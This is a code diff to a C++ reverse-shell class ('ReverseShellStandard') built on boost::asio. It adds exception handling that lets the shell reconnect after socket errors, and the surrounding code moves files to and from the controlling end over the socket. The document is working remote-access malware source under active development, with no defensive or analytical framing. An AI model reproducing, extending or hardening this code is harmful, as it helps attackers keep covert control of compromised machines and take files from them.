@@ -6,8 +6,8 @@
 #include <boost/asio.hpp>
 #include <fstream>
 #include <filesystem>
-#include <iostream>
 #include <boost/format.hpp>
+#include "NetworkExcetion.hpp"
 
 class ReverseShellStandard 
 {
@@ -24,13 +24,14 @@ protected:
 	{
 		m_socket.close();
 		m_ioService.stop();
+		m_file.close();
 	}
 
 	void OpenFileFor(const std::string& filePath, int mode)
 	{
 		m_file.open(filePath, mode);
 		if (!m_file)
-			throw; // TODO - throw specific exception
+			throw std::fstream::failure((boost::format("Couldn't open the file: %1%   Reconnecting...") % filePath).str());
 	}
 
 	size_t Send(const OperationType& operationType)
@@ -60,7 +61,7 @@ protected:
 	{
 		auto bytesSent = boost::asio::write(m_socket, t_buffer, m_errorCode);
 		if (m_errorCode)
-			throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)
+			throw NetworkExcetion("An exception was thrown while writing to the socket. Reconnecting...");
 
 		return bytesSent;
 	}
@@ -69,7 +70,7 @@ protected:
 	{
 		auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, m_delimiter, m_errorCode);
 		if (m_errorCode)
-			throw; // TODO - handle error
+			throw NetworkExcetion("An exception was thrown while reading from the socket. Reconnecting...");
 
 		return CleanReponse(responseSize);
 	}
@@ -89,10 +90,10 @@ private:
 protected:
 	OperationType GetOperationType(const std::string& operation)
 	{
-		if (!m_operations.count(operation))
-			return INVALID;
+		if (m_operations.count(operation))
+			return m_operations[operation];
 
-		return m_operations[operation];
+		return INVALID;
 	}
 
 	void UploadFile(const std::string& localFilePath)
@@ -147,6 +148,9 @@ private:
 			auto bufferSize = std::min(static_cast<int>(m_socket.available()), DEFAULT_BUFFER_SIZE);
 			auto buf = boost::asio::buffer(response, bufferSize);
 			auto responseSize = boost::asio::read(m_socket, buf, m_errorCode);
+			if(m_errorCode)
+				throw NetworkExcetion("An exception was thrown while reading from the socket. Reconnecting...");
+
 			m_file.write(response.data(), responseSize);
 			std::cout << "Target: " << amountOfBytes << "   Current: " << m_file.tellp() << " Response size: " << responseSize << std::endl;
 		}
